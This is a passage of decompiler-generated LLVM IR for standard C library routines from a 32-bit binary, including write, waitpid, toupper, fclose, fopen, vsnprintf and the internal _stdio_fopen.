  %v0_804fe50 = phi i32 [ %v2_804fe38, %entry ], [ -1, %dec_label_pc_804fe44 ]
  %v2_804fe52 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe52, i32* @edx, align 4
  %v2_804fe54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fe54, i32* @edi, align 4
  ret i32 %v0_804fe50

; uselistorder directives
  uselistorder i32 %v2_804fe38, { 1, 0, 2 }
  uselistorder i32 %v0_804fe30, { 1, 0 }
  uselistorder label %dec_label_pc_804fe50, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_804fe69 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_804fe69
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe74 = load i32, i32* @edi, align 4
  store i32 %v0_804fe74, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804fe84 = load i32, i32* @ebx, align 4
  %v4_804fe8c = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804fe84, i32* @ebx, align 4
  store i32 %v4_804fe8c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804fe8c, -4095
  br i1 %tmp11, label %dec_label_pc_804fea4, label %dec_label_pc_804fe98

dec_label_pc_804fe98:                             ; preds = %entry
  %v1_804fe98 = call i32 @__errno_location(i32 %v0_804fe84)
  %v0_804fe9d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe9d = sub i32 0, %v0_804fe9d
  %v2_804fe9f = inttoptr i32 %v1_804fe98 to i32*
  store i32 %v1_804fe9d, i32* %v2_804fe9f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fea4

dec_label_pc_804fea4:                             ; preds = %entry, %dec_label_pc_804fe98
  %v0_804fea4 = phi i32 [ %v4_804fe8c, %entry ], [ -1, %dec_label_pc_804fe98 ]
  %v2_804fea6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fea6, i32* @edx, align 4
  %v2_804fea8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fea8, i32* @edi, align 4
  ret i32 %v0_804fea4

; uselistorder directives
  uselistorder i32 %v4_804fe8c, { 1, 0, 2 }
  uselistorder i32 %v0_804fe84, { 1, 0 }
  uselistorder label %dec_label_pc_804fea4, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804feb0 = load i32, i32* inttoptr (i32 134615756 to i32*), align 4
  %v2_804feb5 = mul i32 %arg1, 2
  %v3_804feb5 = add i32 %v0_804feb0, %v2_804feb5
  %v4_804feb5 = inttoptr i32 %v3_804feb5 to i16*
  %v5_804feb5 = load i16, i16* %v4_804feb5, align 2
  %v6_804feb5 = zext i16 %v5_804feb5 to i32
  %v1_804feb9 = and i32 %v6_804feb5, 32
  ret i32 %v1_804feb9
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804fec4 = add i32 %arg1, 128
  %v6_804fecf = icmp ugt i32 %v1_804fec4, 383
  br i1 %v6_804fecf, label %dec_label_pc_804feda, label %dec_label_pc_804fed1

dec_label_pc_804fed1:                             ; preds = %entry
  %v0_804fed1 = load i32, i32* inttoptr (i32 134615764 to i32*), align 4
  %v2_804fed6 = mul i32 %arg1, 2
  %v3_804fed6 = add i32 %v0_804fed1, %v2_804fed6
  %v4_804fed6 = inttoptr i32 %v3_804fed6 to i16*
  %v5_804fed6 = load i16, i16* %v4_804fed6, align 2
  %v6_804fed6 = sext i16 %v5_804fed6 to i32
  store i32 %v6_804fed6, i32* @edx, align 4
  br label %dec_label_pc_804feda

dec_label_pc_804feda:                             ; preds = %entry, %dec_label_pc_804fed1
  %v0_804feda = phi i32 [ %arg1, %entry ], [ %v6_804fed6, %dec_label_pc_804fed1 ]
  ret i32 %v0_804feda

; uselistorder directives
  uselistorder label %dec_label_pc_804feda, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80677e0.700 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804fee8 = load i32, i32* @ebp, align 4
  %v0_804fee9 = load i32, i32* @edi, align 4
  %v0_804feea = load i32, i32* @esi, align 4
  %v0_804feeb = load i32, i32* @ebx, align 4
  %v4_804feef = ptrtoint i16* %arg1 to i32
  store i32 %v4_804feef, i32* @esi, align 4
  %v1_804fef3 = add i32 %v4_804feef, 52
  %v2_804fef3 = inttoptr i32 %v1_804fef3 to i32*
  %v3_804fef3 = load i32, i32* %v2_804fef3, align 4
  store i32 %v3_804fef3, i32* @ebp, align 4
  %v1_804fef6 = icmp eq i32 %v3_804fef3, 0
  %v1_804fef8 = icmp eq i1 %v1_804fef6, false
  br i1 %v1_804fef8, label %dec_label_pc_804ff19, label %dec_label_pc_804fefa

dec_label_pc_804fefa:                             ; preds = %entry
  %v1_804fefa = add i32 %v4_804feef, 56
  store i32 %v1_804fefa, i32* @ebx, align 4
  %v2_804ff04 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ff04, i32* @eax, align 4
  %v2_804ff09 = call i32 @__pthread_return_void(i32 %v2_804ff04, i32 134560279)
  %v0_804ff0e = load i32, i32* @ebx, align 4
  %v1_804ff11 = call i32 @__pthread_return_0(i32 %v0_804ff0e)
  store i32 %v1_804ff11, i32* @eax, align 4
  %v0_804ff1b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ff19

dec_label_pc_804ff19:                             ; preds = %entry, %dec_label_pc_804fefa
  %v0_804ff23 = phi i32 [ %v4_804feef, %entry ], [ %v0_804ff1b.pre, %dec_label_pc_804fefa ]
  store i32 0, i32* @edi, align 4
  %v1_804ff1b = inttoptr i32 %v0_804ff23 to i8*
  %v2_804ff1b = load i8, i8* %v1_804ff1b, align 1
  %v3_804ff1b = and i8 %v2_804ff1b, 64
  %v4_804ff1b = icmp eq i8 %v3_804ff1b, 0
  br i1 %v4_804ff1b, label %dec_label_pc_804ff19.dec_label_pc_804ff2e_crit_edge, label %dec_label_pc_804ff20

dec_label_pc_804ff19.dec_label_pc_804ff2e_crit_edge: ; preds = %dec_label_pc_804ff19
  br label %dec_label_pc_804ff2e

dec_label_pc_804ff20:                             ; preds = %dec_label_pc_804ff19
  %v1_804ff24 = inttoptr i32 %v0_804ff23 to i16*
  %v2_804ff24 = call i32 @fflush_unlocked(i16* %v1_804ff24)
  store i32 %v2_804ff24, i32* @edi, align 4
  %v0_804ff31.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ff2e

dec_label_pc_804ff2e:                             ; preds = %dec_label_pc_804ff19.dec_label_pc_804ff2e_crit_edge, %dec_label_pc_804ff20
  %v0_804ff31 = phi i32 [ %v0_804ff23, %dec_label_pc_804ff19.dec_label_pc_804ff2e_crit_edge ], [ %v0_804ff31.pre, %dec_label_pc_804ff20 ]
  %v1_804ff31 = add i32 %v0_804ff31, 4
  %v2_804ff31 = inttoptr i32 %v1_804ff31 to i32*
  %v3_804ff31 = load i32, i32* %v2_804ff31, align 4
  %v1_804ff34 = call i32 @__libc_close(i32 %v3_804ff31)
  store i32 %v1_804ff34, i32* @eax, align 4
  %v2_804ff3c = icmp slt i32 %v1_804ff34, 0
  %v1_804ff3e = icmp eq i1 %v2_804ff3c, false
  br i1 %v1_804ff3e, label %dec_label_pc_804ff43, label %dec_label_pc_804ff40

dec_label_pc_804ff40:                             ; preds = %dec_label_pc_804ff2e
  store i32 -1, i32* @edi, align 4
  br label %dec_label_pc_804ff43

dec_label_pc_804ff43:                             ; preds = %dec_label_pc_804ff2e, %dec_label_pc_804ff40
  %v0_804ff43 = load i32, i32* @esi, align 4
  %v1_804ff43 = add i32 %v0_804ff43, 4
  %v2_804ff43 = inttoptr i32 %v1_804ff43 to i32*
  store i32 -1, i32* %v2_804ff43, align 4
  %v2_804ff55 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804ff55, i32* @ebx, align 4
  %v2_804ff5a = call i32 @__pthread_return_void(i32 %v2_804ff55, i32 134560279)
  %v1_804ff66 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  %v0_804ff6b = load i32, i32* @global_var_80655a4.702, align 4
  %v1_804ff70 = add i32 %v0_804ff6b, 1
  store i32 %v1_804ff70, i32* @global_var_80655a4.702, align 4
  store i32 ptrtoint (i32* @global_var_8061308.701 to i32), i32* @eax, align 4
  %v2_804ff7b = call i32 @__pthread_return_void(i32 %v2_804ff55, i32 1)
  store i32 %v2_804ff7b, i32* @eax, align 4
  %v0_804ff83 = load i32, i32* @esi, align 4
  %v1_804ff83 = inttoptr i32 %v0_804ff83 to i16*
  %v2_804ff83 = load i16, i16* %v1_804ff83, align 2
  %v3_804ff83 = and i16 %v2_804ff83, 24576
  store i16 %v3_804ff83, i16* %v1_804ff83, align 2
  %v0_804ff88 = load i32, i32* @esi, align 4
  %v1_804ff88 = inttoptr i32 %v0_804ff88 to i16*
  %v2_804ff88 = load i16, i16* %v1_804ff88, align 2
  %v3_804ff88 = or i16 %v2_804ff88, 48
  store i16 %v3_804ff88, i16* %v1_804ff88, align 2
  br i1 %v1_804fef8, label %dec_label_pc_804ffa1, label %dec_label_pc_804ff90

dec_label_pc_804ff90:                             ; preds = %dec_label_pc_804ff43
  %v2_804ff94 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804ff94, i32* @eax, align 4
  %v2_804ff99 = call i32 @__pthread_return_void(i32 %v2_804ff94, i32 1)
  store i32 %v2_804ff99, i32* @eax, align 4
  br label %dec_label_pc_804ffa1

dec_label_pc_804ffa1:                             ; preds = %dec_label_pc_804ff43, %dec_label_pc_804ff90
  %v0_804ffa1 = load i32, i32* @esi, align 4
  %v1_804ffa1 = add i32 %v0_804ffa1, 1
  %v2_804ffa1 = inttoptr i32 %v1_804ffa1 to i8*
  %v3_804ffa1 = load i8, i8* %v2_804ffa1, align 1
  %v4_804ffa1 = and i8 %v3_804ffa1, 64
  %v5_804ffa1 = icmp eq i8 %v4_804ffa1, 0
  br i1 %v5_804ffa1, label %dec_label_pc_804ffb5, label %dec_label_pc_804ffa7

dec_label_pc_804ffa7:                             ; preds = %dec_label_pc_804ffa1
  %v1_804ffaa = add i32 %v0_804ffa1, 8
  %v2_804ffaa = inttoptr i32 %v1_804ffaa to i32*
  %v3_804ffaa = load i32, i32* %v2_804ffaa, align 4
  %v1_804ffad = call i32 @free(i32 %v3_804ffaa)
  store i32 %v1_804ffad, i32* @eax, align 4
  br label %dec_label_pc_804ffb5

dec_label_pc_804ffb5:                             ; preds = %dec_label_pc_804ffa1, %dec_label_pc_804ffa7
  %v2_804ffc1 = call i32 @__pthread_return_void(i32 %v2_804ff55, i32 134560279)
  %v1_804ffcd = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8061308.701 to i32))
  store i32 ptrtoint (i32* @global_var_8061308.701 to i32), i32* @eax, align 4
  %v0_804ffd4 = load i32, i32* @global_var_80655a8.703, align 8
  %v1_804ffd4 = add i32 %v0_804ffd4, 1
  store i32 %v1_804ffd4, i32* @global_var_80655a8.703, align 8
  %v2_804ffdd = call i32 @__pthread_return_void(i32 %v2_804ff55, i32 1)
  %v0_804ffe2 = call i32 @_stdio_openlist_dec_use()
  %v0_804ffea = load i32, i32* @edi, align 4
  store i32 %v0_804feeb, i32* @ebx, align 4
  store i32 %v0_804feea, i32* @esi, align 4
  store i32 %v0_804fee9, i32* @edi, align 4
  store i32 %v0_804fee8, i32* @ebp, align 4
  ret i32 %v0_804ffea

; uselistorder directives
  uselistorder label %dec_label_pc_804ffb5, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa1, { 1, 0 }
  uselistorder label %dec_label_pc_804ff43, { 1, 0 }
  uselistorder label %dec_label_pc_804ff2e, { 1, 0 }
  uselistorder label %dec_label_pc_804ff19, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8050003 = inttoptr i32 %arg2 to i8*
  %v5_8050003 = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_8050003, i32 0, i32 -1)
  ret i32 %v5_8050003
}

declare i32 @printf(i8*, ...) local_unnamed_addr

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_805002f = ptrtoint i32* %stack_var_12 to i32
  %v4_8050042 = inttoptr i32 %arg1 to i8*
  %v5_8050042 = call i32 @__GI_vsnprintf(i8* %v4_8050042, i32 -1, i32 %arg2, i32 %v2_805002f)
  ret i32 %v5_8050042
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805004c = load i32, i32* @ebp, align 4
  %v0_805004d = load i32, i32* @edi, align 4
  %v0_805004e = load i32, i32* @esi, align 4
  %v0_805004f = load i32, i32* @ebx, align 4
  store i32 %v0_805004f, i32* %stack_var_-16, align 4
  %v4_8050053 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8050053, i32* @esi, align 4
  %v2_8050057 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v2_8050088 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_8050088, i32* @ebp, align 4
  %v1_805008c = sub i32 -1, %v4_8050053
  store i32 %v1_805008c, i32* @ebx, align 4
  %v1_805008f = call i32 @__stdio_init_mutex(i32 %v2_8050057)
  %v0_805009f = load i32, i32* @ebx, align 4
  %v1_805009f = load i32, i32* @edi, align 4
  %tmp33 = icmp ugt i32 %v0_805009f, %v1_805009f
  br i1 %tmp33, label %dec_label_pc_80500a3, label %dec_label_pc_80500a5

dec_label_pc_80500a3:                             ; preds = %entry
  store i32 %v1_805009f, i32* @ebx, align 4
  br label %dec_label_pc_80500a5

dec_label_pc_80500a5:                             ; preds = %entry, %dec_label_pc_80500a3
  %v1_80500a5 = phi i32 [ %v0_805009f, %entry ], [ %v1_805009f, %dec_label_pc_80500a3 ]
  %v0_80500a5 = load i32, i32* @esi, align 4
  %v2_80500a5 = add i32 %v0_80500a5, %v1_80500a5
  %v4_80500d0 = inttoptr i32 %arg3 to i8*
  %v5_80500d0 = call i32 @_vfprintf_internal(i32 %v2_8050088, i8* %v4_80500d0, i32 %arg4, i32 %v2_80500a5)
  store i32 %v5_80500d0, i32* @edx, align 4
  %v0_80500da = load i32, i32* @ebx, align 4
  %v1_80500da = icmp eq i32 %v0_80500da, 0
  br i1 %v1_80500da, label %dec_label_pc_80500f4, label %dec_label_pc_80500de

dec_label_pc_80500de:                             ; preds = %dec_label_pc_80500a5
  %v16_80500e2 = icmp eq i32 %v1_80500a5, 0
  %v1_80500e6 = icmp eq i1 %v16_80500e2, false
  br i1 %v1_80500e6, label %dec_label_pc_80500ed, label %dec_label_pc_80500e8

dec_label_pc_80500e8:                             ; preds = %dec_label_pc_80500de
  %v1_80500e8 = add i32 %v2_80500a5, -1
  br label %dec_label_pc_80500ed

dec_label_pc_80500ed:                             ; preds = %dec_label_pc_80500de, %dec_label_pc_80500e8
  %stack_var_-80.0.in = phi i32 [ %v0_80500a5, %dec_label_pc_80500de ], [ %v1_80500e8, %dec_label_pc_80500e8 ]
  %stack_var_-80.0 = inttoptr i32 %stack_var_-80.0.in to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_80500f7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80500f4

dec_label_pc_80500f4:                             ; preds = %dec_label_pc_80500a5, %dec_label_pc_80500ed
  %v0_80500f7 = phi i32 [ %v5_80500d0, %dec_label_pc_80500a5 ], [ %v0_80500f7.pre, %dec_label_pc_80500ed ]
  %v2_80500f9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80500f9, i32* @ebx, align 4
  store i32 %v0_805004e, i32* @esi, align 4
  store i32 %v0_805004d, i32* @edi, align 4
  store i32 %v0_805004c, i32* @ebp, align 4
  ret i32 %v0_80500f7

; uselistorder directives
  uselistorder i32 %v0_80500a5, { 1, 0 }
  uselistorder i32 %v1_80500a5, { 1, 0 }
  uselistorder i32 %v1_805009f, { 1, 2, 0 }
  uselistorder i32 %v0_805009f, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder label %dec_label_pc_80500f4, { 1, 0 }
  uselistorder label %dec_label_pc_80500ed, { 1, 0 }
  uselistorder label %dec_label_pc_80500a5, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050100 = load i32, i32* @ebp, align 4
  %v0_8050101 = load i32, i32* @edi, align 4
  %v0_8050102 = load i32, i32* @esi, align 4
  %v0_8050103 = load i32, i32* @ebx, align 4
  store i32 %v0_8050103, i32* %stack_var_-16, align 4
  %v4_8050107 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050107, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050117 = load i8, i8* %arg2, align 1
  %v3_8050117 = zext i8 %v2_8050117 to i32
  %v4_8050117 = load i32, i32* @eax, align 4
  %v5_8050117 = and i32 %v4_8050117, -256
  %v6_8050117 = or i32 %v5_8050117, %v3_8050117
  store i32 %v6_8050117, i32* %eax.global-to-local, align 4
  %v10_8050119 = icmp eq i8 %v2_8050117, 114
  br i1 %v10_8050119, label %dec_label_pc_805015b, label %dec_label_pc_805011d

dec_label_pc_805011d:                             ; preds = %entry
  store i32 577, i32* @ebx, align 4
  %v10_8050122 = icmp eq i8 %v2_8050117, 119
  br i1 %v10_8050122, label %dec_label_pc_805015d, label %dec_label_pc_8050126

dec_label_pc_8050126:                             ; preds = %dec_label_pc_805011d
  store i32 1089, i32* @ebx, align 4
  %v10_805012a = icmp eq i8 %v2_8050117, 97
  br i1 %v10_805012a, label %dec_label_pc_805015d, label %dec_label_pc_805012e

dec_label_pc_805012e:                             ; preds = %dec_label_pc_80501d6, %dec_label_pc_80501b0, %dec_label_pc_8050126
  %v0_805012e = load i32, i32* %stack_var_-16, align 4
  %v1_805012e = call i32 @__errno_location(i32 %v0_805012e)
  store i32 %v1_805012e, i32* %eax.global-to-local, align 4
  %v0_8050133 = load i32, i32* @ebp, align 4
  %v1_8050133 = icmp eq i32 %v0_8050133, 0
  %v1_8050135 = inttoptr i32 %v1_805012e to i32*
  store i32 22, i32* %v1_8050135, align 4
  br i1 %v1_8050133, label %dec_label_pc_8050323, label %dec_label_pc_8050141

dec_label_pc_8050141:                             ; preds = %dec_label_pc_80501ff, %dec_label_pc_805012e
  %v0_8050141 = load i32, i32* @ebp, align 4
  %v1_8050141 = add i32 %v0_8050141, 1
  %v2_8050141 = inttoptr i32 %v1_8050141 to i8*
  %v3_8050141 = load i8, i8* %v2_8050141, align 1
  %v4_8050141 = and i8 %v3_8050141, 32
  %v5_8050141 = icmp eq i8 %v4_8050141, 0
  br i1 %v5_8050141, label %dec_label_pc_8050323, label %dec_label_pc_805014b

dec_label_pc_805014b:                             ; preds = %dec_label_pc_8050141
  store i32 %v0_8050141, i32* %stack_var_-76, align 4
  %v1_805014f = call i32 @free(i32 %v0_8050141)
  store i32 %v1_805014f, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805031e

dec_label_pc_805015b:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_805015d

dec_label_pc_805015d:                             ; preds = %dec_label_pc_8050126, %dec_label_pc_805011d, %dec_label_pc_805015b
  %v0_805016e = phi i32 [ 1089, %dec_label_pc_8050126 ], [ 577, %dec_label_pc_805011d ], [ 1, %dec_label_pc_805015b ]
  %v1_805015d = add i32 %v4_8050107, 1
  store i32 %v1_805015d, i32* %eax.global-to-local, align 4
  %v2_8050160 = inttoptr i32 %v1_805015d to i8*
  %v3_8050160 = load i8, i8* %v2_8050160, align 1
  %v12_8050160 = icmp eq i8 %v3_8050160, 98
  br i1 %v12_8050160, label %dec_label_pc_8050168, label %dec_label_pc_8050166

dec_label_pc_8050166:                             ; preds = %dec_label_pc_805015d
  store i32 %v4_8050107, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050168

dec_label_pc_8050168:                             ; preds = %dec_label_pc_805015d, %dec_label_pc_8050166
  %v0_8050168 = phi i32 [ %v1_805015d, %dec_label_pc_805015d ], [ %v4_8050107, %dec_label_pc_8050166 ]
  %v1_8050168 = add i32 %v0_8050168, 1
  %v2_8050168 = inttoptr i32 %v1_8050168 to i8*
  %v3_8050168 = load i8, i8* %v2_8050168, align 1
  %v12_8050168 = icmp eq i8 %v3_8050168, 43
  %v1_805016c = icmp eq i1 %v12_8050168, false
  br i1 %v1_805016c, label %dec_label_pc_8050176, label %dec_label_pc_805016e

dec_label_pc_805016e:                             ; preds = %dec_label_pc_8050168
  store i32 %v0_805016e, i32* %eax.global-to-local, align 4
  %v1_8050173 = add nuw nsw i32 %v0_805016e, 1
  store i32 %v1_8050173, i32* @ebx, align 4
  br label %dec_label_pc_8050176

dec_label_pc_8050176:                             ; preds = %dec_label_pc_8050168, %dec_label_pc_805016e
  %v1_8050176 = icmp eq i32 %arg3, 0
  %v1_8050178 = icmp eq i1 %v1_8050176, false
  br i1 %v1_8050178, label %dec_label_pc_80501ac, label %dec_label_pc_805017a

dec_label_pc_805017a:                             ; preds = %dec_label_pc_8050176
  store i32 80, i32* %stack_var_-76, align 4
  %v1_805017f = call i32 @malloc(i32 80)
  store i32 %v1_805017f, i32* %eax.global-to-local, align 4
  store i32 %v1_805017f, i32* @ebp, align 4
  %v2_8050189 = icmp eq i32 %v1_805017f, 0
  br i1 %v2_8050189, label %dec_label_pc_8050325, label %dec_label_pc_8050191

dec_label_pc_8050191:                             ; preds = %dec_label_pc_805017a
  %v2_805017f = inttoptr i32 %v1_805017f to i16*
  store i16 8192, i16* %v2_805017f, align 2
  %v2_8050199 = add i32 %v1_805017f, 8
  %v3_8050199 = inttoptr i32 %v2_8050199 to i32*
  store i32 0, i32* %v3_8050199, align 4
  %v2_80501a0 = add i32 %v1_805017f, 56
  store i32 %v2_80501a0, i32* %eax.global-to-local, align 4
  store i32 %v2_80501a0, i32* %stack_var_-76, align 4
  %v1_80501a4 = call i32 @__stdio_init_mutex(i32 %v2_80501a0)
  store i32 %v1_80501a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80501ac

dec_label_pc_80501ac:                             ; preds = %dec_label_pc_8050176, %dec_label_pc_8050191
  %v2_80501ac = icmp slt i32 %arg4, 0
  br i1 %v2_80501ac, label %dec_label_pc_80501f9, label %dec_label_pc_80501b0

dec_label_pc_80501b0:                             ; preds = %dec_label_pc_80501ac
  %v0_80501b0 = load i32, i32* @ebx, align 4
  %v0_80501b2 = load i32, i32* @esi, align 4
  %v1_80501b2 = add i32 %v0_80501b2, 1
  store i32 %v1_80501b2, i32* %eax.global-to-local, align 4
  %v1_80501b5 = and i32 %v0_80501b0, 32771
  store i32 %v1_80501b5, i32* %edx.global-to-local, align 4
  %v1_80501bb = load i32, i32* @ebp, align 4
  %v2_80501bb = add i32 %v1_80501bb, 4
  %v3_80501bb = inttoptr i32 %v2_80501bb to i32*
  store i32 %arg4, i32* %v3_80501bb, align 4
  %v0_80501be = load i32, i32* %edx.global-to-local, align 4
  %v1_80501be = add i32 %v0_80501be, 1
  store i32 %v1_80501be, i32* @edx, align 4
  %v0_80501bf = load i32, i32* %eax.global-to-local, align 4
  %v2_80501bf = and i32 %v0_80501bf, %v1_80501be
  store i32 %v2_80501bf, i32* %eax.global-to-local, align 4
  %v12_80501c1 = icmp eq i32 %v2_80501bf, %v1_80501be
  %v1_80501c3 = icmp eq i1 %v12_80501c1, false
  br i1 %v1_80501c3, label %dec_label_pc_805012e, label %dec_label_pc_80501c9

dec_label_pc_80501c9:                             ; preds = %dec_label_pc_80501b0
  %v0_80501c9 = load i32, i32* @esi, align 4
  %v1_80501cb = and i32 %v0_80501c9, 1024
  %v1_80501cd = xor i32 %v1_80501cb, 1024
  store i32 %v1_80501cd, i32* %eax.global-to-local, align 4
  %v1_80501d2 = load i32, i32* @ebx, align 4
  %v2_80501d2 = and i32 %v1_80501d2, %v1_80501cd
  %v3_80501d2 = icmp eq i32 %v2_80501d2, 0
  br i1 %v3_80501d2, label %dec_label_pc_80501c9.dec_label_pc_80501ef_crit_edge, label %dec_label_pc_80501d6

dec_label_pc_80501c9.dec_label_pc_80501ef_crit_edge: ; preds = %dec_label_pc_80501c9
  br label %dec_label_pc_80501ef

dec_label_pc_80501d6:                             ; preds = %dec_label_pc_80501c9
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_80501df = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_80501df, i32* %eax.global-to-local, align 4
  %v1_80501e7 = icmp eq i32 %v3_80501df, 0
  %v1_80501e9 = icmp eq i1 %v1_80501e7, false
  br i1 %v1_80501e9, label %dec_label_pc_805012e, label %dec_label_pc_80501d6.dec_label_pc_80501ef_crit_edge

dec_label_pc_80501d6.dec_label_pc_80501ef_crit_edge: ; preds = %dec_label_pc_80501d6
  %v0_80501ef.pre = load i32, i32* @esi, align 4
  %v0_80501f5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80501ef

dec_label_pc_80501ef:                             ; preds = %dec_label_pc_80501c9.dec_label_pc_80501ef_crit_edge, %dec_label_pc_80501d6.dec_label_pc_80501ef_crit_edge
  %v0_80501f5 = phi i32 [ %v1_80501d2, %dec_label_pc_80501c9.dec_label_pc_80501ef_crit_edge ], [ %v0_80501f5.pre, %dec_label_pc_80501d6.dec_label_pc_80501ef_crit_edge ]
  %v0_80501ef = phi i32 [ %v0_80501c9, %dec_label_pc_80501c9.dec_label_pc_80501ef_crit_edge ], [ %v0_80501ef.pre, %dec_label_pc_80501d6.dec_label_pc_80501ef_crit_edge ]
  %v1_80501ef = and i32 %v0_80501ef, 32768
  %v2_80501f5 = or i32 %v1_80501ef, %v0_80501f5
  store i32 %v2_80501f5, i32* @ebx, align 4
  br label %dec_label_pc_805021a

dec_label_pc_80501f9:                             ; preds = %dec_label_pc_80501ac
  %v1_80501f9 = add i32 %arg4, 1
  %v8_80501f9 = icmp eq i32 %v1_80501f9, 0
  store i32 %v1_80501f9, i32* @edi, align 4
  %v0_8050205.pre = load i32, i32* @ebx, align 4
  br i1 %v8_80501f9, label %dec_label_pc_80501ff, label %dec_label_pc_80501fc

dec_label_pc_80501fc:                             ; preds = %dec_label_pc_80501f9
  %v11_80501fc = or i32 %v0_8050205.pre, 32768
  store i32 %v11_80501fc, i32* @ebx, align 4
  br label %dec_label_pc_80501ff

dec_label_pc_80501ff:                             ; preds = %dec_label_pc_80501f9, %dec_label_pc_80501fc
  %v0_8050205 = phi i32 [ %v11_80501fc, %dec_label_pc_80501fc ], [ %v0_8050205.pre, %dec_label_pc_80501f9 ]
  %v0_8050206 = load i32, i32* @esi, align 4
  store i32 %v0_8050206, i32* %stack_var_-76, align 4
  %v3_8050207 = inttoptr i32 %v0_8050206 to i8*
  %v4_8050207 = call i32 @__libc_open(i8* %v3_8050207, i32 %v0_8050205)
  store i32 %v4_8050207, i32* %eax.global-to-local, align 4
  %v1_805020f = load i32, i32* @ebp, align 4
  %v2_805020f = add i32 %v1_805020f, 4
  %v3_805020f = inttoptr i32 %v2_805020f to i32*
  store i32 %v4_8050207, i32* %v3_805020f, align 4
  %v2_8050212 = icmp slt i32 %v4_8050207, 0
  br i1 %v2_8050212, label %dec_label_pc_8050141, label %dec_label_pc_805021a

dec_label_pc_805021a:                             ; preds = %dec_label_pc_80501ff, %dec_label_pc_80501ef
  %v0_805021a = load i32, i32* @ebp, align 4
  %v1_805021a = inttoptr i32 %v0_805021a to i16*
  %v2_805021a = load i16, i16* %v1_805021a, align 2
  %v3_805021a = and i16 %v2_805021a, 8192
  store i16 %v3_805021a, i16* %v1_805021a, align 2
  %v0_8050220 = load i32, i32* @ebx, align 4
  %v8_8050222 = and i32 %v0_8050220, -31744
  %v1_8050227 = urem i32 %v0_8050220, 4
  %v1_805022a = add nuw nsw i32 %v1_8050227, 1
  store i32 %v1_805022a, i32* %eax.global-to-local, align 4
  %v1_805022b = load i32, i32* @ebp, align 4
  %v2_805022b = inttoptr i32 %v1_805022b to i32*
  %v3_805022b = load i32, i32* %v2_805022b, align 4
  %v4_805022b = or i32 %v3_805022b, %v8_8050222
  %v1_805022e = mul nuw nsw i32 %v1_805022a, 16
  %v2_8050231 = xor i32 %v1_805022e, 48
  store i32 %v2_8050231, i32* %eax.global-to-local, align 4
  %v2_8050234 = or i32 %v4_805022b, %v2_8050231
  store i32 %v2_8050234, i32* @ebx, align 4
